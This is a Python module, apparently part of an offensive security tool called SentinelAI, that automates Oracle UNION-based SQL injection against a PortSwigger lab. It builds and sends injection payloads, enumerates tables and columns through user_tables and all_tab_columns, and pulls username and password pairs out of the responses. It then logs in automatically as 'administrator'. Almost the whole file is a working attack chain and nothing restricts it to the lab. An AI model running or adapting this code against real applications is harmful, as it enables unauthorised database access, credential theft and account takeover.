"""
===========================================================
Project : SentinelAI
Module  : Oracle UNION SQL Injection Enumeration
File ID : SCANNER-ORACLE-ENUM-004
Version : 5.0.0
===========================================================

Description:
Oracle UNION SQL Injection enumeration engine.
Rebuilt for PortSwigger Oracle Lab 6 compatibility.
Uses DOM diff-based extraction for reliable results.
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass
class TableScore:
    name: str
    score: int
    reasons: list[str] = field(default_factory=list)


@dataclass
class ColumnScore:
    name: str
    score: int
    col_type: str  # "username", "password", "unknown"
    reasons: list[str] = field(default_factory=list)


class OracleEnum:
    """
    Oracle UNION SQL Injection enumeration engine.
    Uses DOM diff-based extraction for reliable results.
    """

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(self, scanner, visible_columns: list[int], column_count: int) -> None:
        self.scanner = scanner
        self.column_count = column_count
        self.visible_columns = visible_columns
        self.target: str = scanner.target
        self.parameter: str = scanner.parameter
        self.request = scanner.request
        self._log = scanner._log

        if not self.visible_columns:
            raise ValueError("OracleEnum: visible_columns cannot be empty")

        self._log(f"[OracleEnum] Using visible columns: {self.visible_columns}")

        # State
        self.tables: list[str] = []
        self.columns: dict[str, list[str]] = {}
        self.username_col: str | None = None
        self.password_col: str | None = None
        self.user_table: str | None = None
        self.credentials: list[dict[str, str]] = []
        self.lab_solved: bool = False

        # Baseline for DOM diff
        self._baseline_html: str = ""
        self._baseline_response = self._send_request("")
        if self._baseline_response:
            self._baseline_html = self._baseline_response.body

        # Scoring weights
        self.table_keywords = {
            "USERS": 15,
            "USER": 12,
            "ACCOUNT": 10,
            "LOGIN": 9,
            "AUTH": 8,
            "CREDENTIAL": 12,
            "PASSWORD": 10,
            "PASS": 8,
            "CRED": 7,
            "MEMBER": 7,
            "PROFILE": 6,
            "CUSTOMER": 6,
            "ADMIN": 10,
            "ADMINS": 10,
        }

        self.username_keywords = [
            "USERNAME",
            "USER",
            "LOGIN",
            "EMAIL",
            "ACCOUNT",
            "UNAME",
            "USERID",
        ]
        self.password_keywords = [
            "PASSWORD",
            "PASS",
            "PWD",
            "SECRET",
            "HASH",
            "PASSWD",
            "PW",
        ]

    # ============================================================
    # Main Entry Point
    # ============================================================

    def run(self) -> dict[str, Any]:
        """Execute complete Oracle enumeration workflow."""
        self._log("[OracleEnum] Starting enumeration...")

        # Step 1: Enumerate tables
        self._log("[OracleEnum] Step 1: Enumerating tables...")
        tables = self._enumerate_tables()
        if not tables:
            self._log("[OracleEnum] ❌ No tables found")
            return self._empty_result()
        self._log(f"[OracleEnum] ✅ Found {len(tables)} tables")

        # Step 2: Find user table
        self._log("[OracleEnum] Step 2: Finding user table...")
        user_table = self._find_user_table(tables)
        if not user_table:
            self._log("[OracleEnum] ❌ No user table found")
            return self._empty_result()
        self._log(f"[OracleEnum] ✅ User table: {user_table}")

        # Step 3: Enumerate columns
        self._log(f"[OracleEnum] Step 3: Enumerating columns from {user_table}...")
        columns = self._enumerate_columns(user_table)
        if not columns:
            self._log("[OracleEnum] ❌ No columns found")
            return self._empty_result()
        self._log(f"[OracleEnum] ✅ Found {len(columns)} columns")

        # Step 4: Find credential columns
        self._log("[OracleEnum] Step 4: Finding credential columns...")
        username_col, password_col = self._find_credential_columns(columns)
        if not username_col or not password_col:
            self._log("[OracleEnum] ❌ Username/password columns not found")
            return self._empty_result()
        self._log(f"[OracleEnum] ✅ Username: {username_col}, Password: {password_col}")

        # Step 5: Extract credentials
        self._log("[OracleEnum] Step 5: Extracting credentials...")
        credentials = self._extract_credentials(user_table, username_col, password_col)
        if credentials:
            self._log(f"[OracleEnum] ✅ Extracted {len(credentials)} credentials")
            self.credentials = credentials
        else:
            self._log("[OracleEnum] ❌ No credentials extracted")
            return self._empty_result()

        # Step 6: Attempt auto-login
        self._log("[OracleEnum] Step 6: Attempting auto-login...")
        self._attempt_login()

        return {
            "tables": self.tables,
            "columns": self.columns,
            "credentials": self.credentials,
            "username_col": username_col,
            "password_col": password_col,
            "user_table": user_table,
            "lab_solved": self.lab_solved,
        }

    def _empty_result(self) -> dict[str, Any]:
        return {
            "tables": [],
            "columns": {},
            "credentials": [],
            "username_col": None,
            "password_col": None,
            "user_table": None,
            "lab_solved": False,
        }

    # ============================================================
    # Step 1: Table Enumeration
    # ============================================================

    def _enumerate_tables(self) -> list[str]:
        """Enumerate tables using UNION SELECT table_name,NULL FROM user_tables."""
        tables: list[str] = []
        seen: set[str] = set()

        # Try user_tables first
        self._log("[OracleEnum] Enumerating from user_tables...")
        tables = self._enumerate_tables_from_source("user_tables")

        # Fallback to all_tables
        if not tables:
            self._log("[OracleEnum] No tables in user_tables, trying all_tables...")
            tables = self._enumerate_tables_from_source("all_tables")

        # Deduplicate
        for t in tables:
            if t not in seen:
                seen.add(t)
                self.tables.append(t)

        return self.tables

    def _enumerate_tables_from_source(self, source: str) -> list[str]:
        """Enumerate tables from a specific source."""
        tables: list[str] = []
        seen: set[str] = set()
        consecutive_empty = 0

        # Build column list
        col_list = ["NULL"] * self.column_count
        for idx in self.visible_columns:
            if idx == 0:
                col_list[idx] = "table_name"
            else:
                col_list[idx] = "NULL"

        for offset in range(1, 101):
            # Simple ROWNUM pagination
            if offset == 1:
                query = f"SELECT table_name FROM {source} WHERE ROWNUM = 1"
            else:
                excluded = "', '".join(tables)
                query = f"SELECT table_name FROM {source} WHERE table_name NOT IN ('{excluded}') AND ROWNUM = 1"

            payload = f"' UNION SELECT {', '.join(col_list)} FROM ({query})--"

            self._log(f"[OracleEnum]   📤 Table payload offset {offset}")

            response = self._send_request(payload)
            if response is None:
                break

            # Extract table name using DOM diff
            table_name = self._extract_table_name_from_response(response.body)

            if table_name:
                if table_name not in seen:
                    seen.add(table_name)
                    tables.append(table_name)
                    consecutive_empty = 0
                    self._log(f"[OracleEnum]   ✅ Table {len(tables)}: {table_name}")
                else:
                    consecutive_empty += 1
                    if consecutive_empty >= 3:
                        break
            else:
                consecutive_empty += 1
                if consecutive_empty >= 3:
                    break

        return tables

    # ============================================================
    # Step 2: Table Scoring
    # ============================================================

    def _find_user_table(self, tables: list[str]) -> str | None:
        """Find the highest scoring user table."""
        scored: list[TableScore] = []

        for table in tables:
            score = 0
            reasons = []
            upper = table.upper()

            for keyword, weight in self.table_keywords.items():
                if keyword in upper:
                    score += weight
                    reasons.append(f"{keyword}(+{weight})")

            if upper.startswith("USERS"):
                score += 5
                reasons.append("USERS_prefix(+5)")

            if upper.startswith(("SYS", "SYSTEM", "DBA", "AUDIT")):
                score -= 20
                reasons.append("system_table(-20)")

            if len(table) < 4:
                score -= 10
                reasons.append("too_short(-10)")

            scored.append(
                TableScore(
                    name=table,
                    score=score,
                    reasons=reasons if reasons else ["no_match"],
                )
            )

        scored.sort(key=lambda x: x.score, reverse=True)

        for s in scored[:5]:
            self._log(
                f"[OracleEnum]   Table: {s.name}, Score: {s.score}, Reasons: {', '.join(s.reasons)}"
            )

        if scored and scored[0].score > 0:
            self._log(
                f"[OracleEnum] ✅ Selected: {scored[0].name} (score: {scored[0]['score']})"
            )
            return scored[0].name

        for table in tables:
            if "USER" in table.upper():
                self._log(f"[OracleEnum] ✅ Fallback: {table}")
                return table

        return None

    # ============================================================
    # Step 3: Column Enumeration
    # ============================================================

    def _enumerate_columns(self, table: str) -> list[str]:
        """Enumerate columns from a specific table."""
        columns: list[str] = []
        seen: set[str] = set()
        table_upper = table.upper()

        self._log(f"[OracleEnum] Enumerating columns from {table_upper}...")

        col_list = ["NULL"] * self.column_count
        for idx in self.visible_columns:
            if idx == 0:
                col_list[idx] = "column_name"
            else:
                col_list[idx] = "NULL"

        for offset in range(1, 51):
            if offset == 1:
                query = f"SELECT column_name FROM all_tab_columns WHERE table_name = '{table_upper}' AND ROWNUM = 1"
            else:
                excluded = "', '".join(columns)
                query = f"SELECT column_name FROM all_tab_columns WHERE table_name = '{table_upper}' AND column_name NOT IN ('{excluded}') AND ROWNUM = 1"

            payload = f"' UNION SELECT {', '.join(col_list)} FROM ({query})--"

            self._log(f"[OracleEnum]   📤 Column payload offset {offset}")

            response = self._send_request(payload)
            if response is None:
                break

            # Extract column name using DOM diff
            column_name = self._extract_column_name_from_response(response.body)

            if column_name:
                if column_name not in seen:
                    seen.add(column_name)
                    columns.append(column_name)
                    self._log(f"[OracleEnum]   ✅ Column {len(columns)}: {column_name}")
                else:
                    break
            else:
                break

        self.columns[table] = columns
        self._log(f"[OracleEnum] ✅ Found {len(columns)} columns in {table}")
        return columns

    # ============================================================
    # Step 4: Column Scoring
    # ============================================================

    def _find_credential_columns(
        self, columns: list[str]
    ) -> tuple[str | None, str | None]:
        """Find username and password columns using scoring."""
        scored: list[ColumnScore] = []

        for col in columns:
            upper = col.upper()
            username_score = 0
            password_score = 0
            reasons = []

            for keyword in self.username_keywords:
                if keyword in upper:
                    username_score += 10
                    reasons.append(f"{keyword}(+10)")

            for keyword in self.password_keywords:
                if keyword in upper:
                    password_score += 10
                    reasons.append(f"{keyword}(+10)")

            if username_score > password_score and username_score > 0:
                col_type = "username"
                score = username_score
            elif password_score > username_score and password_score > 0:
                col_type = "password"
                score = password_score
            else:
                col_type = "unknown"
                score = max(username_score, password_score)

            if score > 0:
                scored.append(
                    ColumnScore(
                        name=col, score=score, col_type=col_type, reasons=reasons
                    )
                )

        scored.sort(key=lambda x: x.score, reverse=True)

        for s in scored[:5]:
            self._log(
                f"[OracleEnum]   Column: {s.name}, Type: {s.col_type}, Score: {s.score}, Reasons: {', '.join(s.reasons)}"
            )

        username_col = None
        password_col = None

        for s in scored:
            if s.col_type == "username":
                username_col = s.name
                break

        for s in scored:
            if s.col_type == "password" and s.name != username_col:
                password_col = s.name
                break

        if not password_col and len(scored) > 1:
            for s in scored:
                if s.name != username_col:
                    password_col = s.name
                    self._log(
                        f"[OracleEnum] ⚠️ Fallback password column: {password_col}"
                    )
                    break

        if username_col:
            self._log(f"[OracleEnum] ✅ Username column: {username_col}")
        if password_col:
            self._log(f"[OracleEnum] ✅ Password column: {password_col}")

        return username_col, password_col

    # ============================================================
    # Step 5: Credential Extraction
    # ============================================================

    def _extract_credentials(
        self, table: str, username_col: str, password_col: str
    ) -> list[dict[str, str]]:
        """Extract credentials from user table."""
        credentials: list[dict[str, str]] = []
        seen: set[str] = set()

        self._log(f"[OracleEnum] Extracting credentials from {table}...")

        col_list = ["NULL"] * self.column_count
        for idx in self.visible_columns:
            if idx == 0:
                col_list[idx] = username_col
            elif idx == 1:
                col_list[idx] = password_col
            else:
                col_list[idx] = "NULL"

        for offset in range(1, 51):
            if offset == 1:
                query = f"SELECT {username_col}, {password_col} FROM {table} WHERE ROWNUM = 1"
            else:
                excluded = "', '".join(
                    [c.get("username", "") for c in credentials if c.get("username")]
                )
                query = f"SELECT {username_col}, {password_col} FROM {table} WHERE {username_col} NOT IN ('{excluded}') AND ROWNUM = 1"

            payload = f"' UNION SELECT {', '.join(col_list)} FROM ({query})--"

            self._log(f"[OracleEnum]   📤 Credential payload offset {offset}")

            response = self._send_request(payload)
            if response is None:
                break

            cred = self._extract_credential_from_response(response.body)

            if cred:
                key = f"{cred.get('username')}:{cred.get('password')}"
                if key not in seen:
                    seen.add(key)
                    credentials.append(cred)
                    self._log(
                        f"[OracleEnum]   ✅ Row {len(credentials)}: "
                        f"{cred.get('username')}:{cred.get('password')}"
                    )
                else:
                    break
            else:
                break

        self.credentials = credentials
        return credentials

    # ============================================================
    # DOM Diff Parser
    # ============================================================

    def _extract_container(self, html: str) -> str | None:
        """Extract the product container from HTML."""
        if not html:
            return None

        # Remove scripts and styles
        html = re.sub(
            r"<script[^>]*>.*?</script>", " ", html, flags=re.DOTALL | re.IGNORECASE
        )
        html = re.sub(
            r"<style[^>]*>.*?</style>", " ", html, flags=re.DOTALL | re.IGNORECASE
        )

        # Remove navigation, header, footer
        html = re.sub(
            r"<nav[^>]*>.*?</nav>", " ", html, flags=re.DOTALL | re.IGNORECASE
        )
        html = re.sub(
            r"<header[^>]*>.*?</header>", " ", html, flags=re.DOTALL | re.IGNORECASE
        )
        html = re.sub(
            r"<footer[^>]*>.*?</footer>", " ", html, flags=re.DOTALL | re.IGNORECASE
        )
        html = re.sub(
            r"<title[^>]*>.*?</title>", " ", html, flags=re.DOTALL | re.IGNORECASE
        )

        # Remove lab header
        html = re.sub(
            r'<div[^>]*id="academyLabHeader"[^>]*>.*?</div>',
            " ",
            html,
            flags=re.DOTALL | re.IGNORECASE,
        )

        # Find product container
        container_patterns = [
            r'<section[^>]*class="[^"]*products?[^"]*"[^>]*>(.*?)</section>',
            r'<section[^>]*class="[^"]*product-list[^"]*"[^>]*>(.*?)</section>',
            r'<div[^>]*class="[^"]*products?[^"]*"[^>]*>(.*?)</div>',
            r'<div[^>]*class="[^"]*product-list[^"]*"[^>]*>(.*?)</div>',
            r'<section[^>]*class="[^"]*ecoms[^"]*"[^>]*>(.*?)</section>',
            r"<table[^>]*>(.*?)</table>",
            r"<tbody[^>]*>(.*?)</tbody>",
        ]

        for pattern in container_patterns:
            match = re.search(pattern, html, re.DOTALL | re.IGNORECASE)
            if match:
                return match.group(1)

        # Fallback: remove header and get body content
        html = re.sub(
            r'<div[^>]*id="academyLabHeader"[^>]*>.*?</div>',
            " ",
            html,
            flags=re.DOTALL | re.IGNORECASE,
        )
        return html

    def _get_visible_text(self, html: str) -> str:
        """Extract visible text from HTML container."""
        if not html:
            return ""

        text = re.sub(r"<[^>]+>", " ", html)
        text = re.sub(r"\s+", " ", text)
        text = re.sub(r"&[a-z]+;", " ", text)
        text = re.sub(r"Home\s*\|\s*My account", "", text)
        text = re.sub(r"Refine your search", "", text)
        text = text.strip()

        return text

    def _find_diff(self, text: str, baseline: str) -> str:
        """Find the difference between two texts."""
        if not text:
            return ""

        if not baseline:
            return text

        # Find by word difference
        baseline_words = set(baseline.split())
        text_words = set(text.split())
        diff_words = text_words - baseline_words

        if diff_words:
            return " ".join(diff_words)

        return ""

    # ============================================================
    # Extraction Helpers
    # ============================================================

    def _extract_table_name_from_response(self, html: str) -> str | None:
        """Extract table name from response using DOM diff."""
        container = self._extract_container(html)
        if not container:
            return None

        clean_text = self._get_visible_text(container)
        baseline_text = self._get_visible_text(
            self._extract_container(self._baseline_html) or ""
        )

        diff = self._find_diff(clean_text, baseline_text)

        if not diff:
            return None

        # Look for uppercase table names
        pattern = re.compile(r"\b([A-Z_][A-Z0-9_]{3,30})\b")
        matches = pattern.findall(diff)

        # Noise filter
        noise = {
            "NULL",
            "DUAL",
            "ROWNUM",
            "TABLE_NAME",
            "USER_TABLES",
            "ALL_TABLES",
            "SELECT",
            "FROM",
            "WHERE",
            "AND",
            "OR",
            "NOT",
            "IN",
            "IS",
            "LIKE",
            "ORDER",
            "BY",
            "GROUP",
            "HAVING",
            "UNION",
            "ALL",
            "DISTINCT",
            "COUNT",
            "PRODUCTS",
            "GIFTS",
            "CLOTHING",
            "LIFESTYLE",
            "PETS",
            "TOYS",
            "GAMES",
            "ACCESSORIES",
            "SHOES",
            "FOOD",
            "DRINK",
            "HOME",
            "ACCOUNT",
            "LOGOUT",
            "LOGIN",
            "REGISTER",
            "REFINE",
            "SEARCH",
            "CATEGORY",
            "FILTER",
            "SQL",
            "ORACLE",
            "INJECTION",
            "ATTACK",
            "LISTING",
            "DATABASE",
            "CONTENTS",
        }

        for match in matches:
            if match not in noise and len(match) > 2:
                if not match.startswith(("SYS", "SYSTEM", "AUDIT", "DBA")):
                    return match

        return None

    def _extract_column_name_from_response(self, html: str) -> str | None:
        """Extract column name from response using DOM diff."""
        container = self._extract_container(html)
        if not container:
            return None

        clean_text = self._get_visible_text(container)
        baseline_text = self._get_visible_text(
            self._extract_container(self._baseline_html) or ""
        )

        diff = self._find_diff(clean_text, baseline_text)

        if not diff:
            return None

        pattern = re.compile(r"\b([A-Z_][A-Z0-9_]{3,30})\b")
        matches = pattern.findall(diff)

        noise = {
            "NULL",
            "DUAL",
            "ROWNUM",
            "COLUMN_NAME",
            "ALL_TAB_COLUMNS",
            "USER_TAB_COLUMNS",
            "TABLE_NAME",
            "SELECT",
            "FROM",
            "WHERE",
            "AND",
            "OR",
            "NOT",
            "IN",
            "IS",
            "LIKE",
            "ORDER",
            "BY",
            "GROUP",
            "HAVING",
            "UNION",
            "ALL",
            "DISTINCT",
            "COUNT",
            "PRODUCTS",
            "GIFTS",
            "CLOTHING",
            "LIFESTYLE",
            "PETS",
            "TOYS",
            "GAMES",
        }

        for match in matches:
            if match not in noise and len(match) > 2:
                return match

        return None

    def _extract_credential_from_response(self, html: str) -> dict[str, str] | None:
        """Extract credential pair from response using DOM diff."""
        container = self._extract_container(html)
        if not container:
            return None

        clean_text = self._get_visible_text(container)
        baseline_text = self._get_visible_text(
            self._extract_container(self._baseline_html) or ""
        )

        diff = self._find_diff(clean_text, baseline_text)

        if not diff:
            return None

        patterns = [
            r"([a-zA-Z0-9_]{3,30})\s*[:|]\s*([a-zA-Z0-9_]{3,30})",
            r"([a-zA-Z0-9_]{3,30})\s*\|\s*([a-zA-Z0-9_]{3,30})",
            r"([a-zA-Z0-9_]{3,30})\s+([a-zA-Z0-9_]{3,30})",
        ]

        noise = {
            "NULL",
            "DUAL",
            "SELECT",
            "FROM",
            "WHERE",
            "AND",
            "OR",
            "NOT",
            "IN",
            "IS",
            "LIKE",
            "ORDER",
            "BY",
            "GROUP",
            "HAVING",
            "UNION",
            "ALL",
            "DISTINCT",
            "COUNT",
            "SUM",
            "AVG",
            "MIN",
            "MAX",
            "ROWNUM",
            "SQL",
            "ORACLE",
            "INJECTION",
            "ATTACK",
            "LISTING",
            "DATABASE",
            "CONTENTS",
        }

        for pattern in patterns:
            matches = re.findall(pattern, diff, re.IGNORECASE)
            for match in matches:
                if len(match) == 2:
                    username = match[0].strip()
                    password = match[1].strip()

                    if username.upper() in noise or password.upper() in noise:
                        continue
                    if len(username) < 2 or len(password) < 2:
                        continue
                    if len(username) > 30 or len(password) > 30:
                        continue
                    if not re.search(r"[a-zA-Z]", username) or not re.search(
                        r"[a-zA-Z]", password
                    ):
                        continue

                    return {"username": username, "password": password}

        return None

    # ============================================================
    # Auto-Login
    # ============================================================

    def _attempt_login(self) -> bool:
        """Attempt to login as administrator."""
        admin_password = None

        for cred in self.credentials:
            if cred.get("username", "").lower() == "administrator":
                admin_password = cred.get("password")
                break

        if not admin_password:
            self._log("[OracleEnum] ❌ No administrator credentials found")
            return False

        self._log(f"[OracleEnum] 🔑 Found administrator password: {admin_password}")

        login_url = self.target.split("/filter")[0] + "/login"

        try:
            from app.agents.post_exploitation_agent import PostExploitationAgent

            agent = PostExploitationAgent()
            result = agent.exploit_credentials(
                login_url, [{"username": "administrator", "password": admin_password}]
            )

            if result:
                self._log("[OracleEnum] ✅ Auto-login successful!")
                self.lab_solved = True
                return True
            else:
                self._log("[OracleEnum] ❌ Auto-login failed")
                return False

        except Exception as e:
            self._log(f"[OracleEnum] ❌ Login error: {e}")
            return False

    # ============================================================
    # HTTP Helpers
    # ============================================================

    def _send_request(self, payload: str):
        """Send a request with the given payload."""
        self.scanner.statistics["requests"] += 1

        try:
            import urllib.parse

            if "?" in self.target:
                base_url = self.target.split("?")[0]
                existing_params = (
                    self.target.split("?")[1] if "?" in self.target else ""
                )
                encoded_payload = urllib.parse.quote(payload, safe="")

                if existing_params:
                    params_list = existing_params.split("&")
                    new_params = []
                    for param in params_list:
                        if param.startswith(f"{self.parameter}="):
                            new_params.append(f"{self.parameter}={encoded_payload}")
                        else:
                            new_params.append(param)
                    url = f"{base_url}?{'&'.join(new_params)}"
                else:
                    url = f"{base_url}?{self.parameter}={encoded_payload}"
            else:
                encoded_payload = urllib.parse.quote(payload, safe="")
                url = f"{self.target}?{self.parameter}={encoded_payload}"

            self._log(f"[OracleEnum]   🌐 URL: {url[:120]}...")

            response = self.request.send(method="GET", url=url)

            if response:
                self._log(
                    f"[OracleEnum]   📥 Status: {response.status_code}, Length: {len(response.body)}"
                )
            else:
                self._log("[OracleEnum]   ❌ No response")

            return response

        except Exception as e:
            self._log(f"[OracleEnum] ❌ Request failed: {e}")
            return None


# ============================================================
# Factory Function
# ============================================================


def oracle_enumeration(
    scanner, visible_columns: list[int], column_count: int
) -> dict[str, Any]:
    """
    Factory function for Oracle enumeration.

    Args:
        scanner: UnionSQLiScanner instance
        visible_columns: Already detected visible columns
        column_count: Number of columns detected by UnionSQLi

    Returns:
        Dictionary with tables, columns, and credentials
    """
    enum = OracleEnum(scanner, visible_columns, column_count)
    return enum.run()
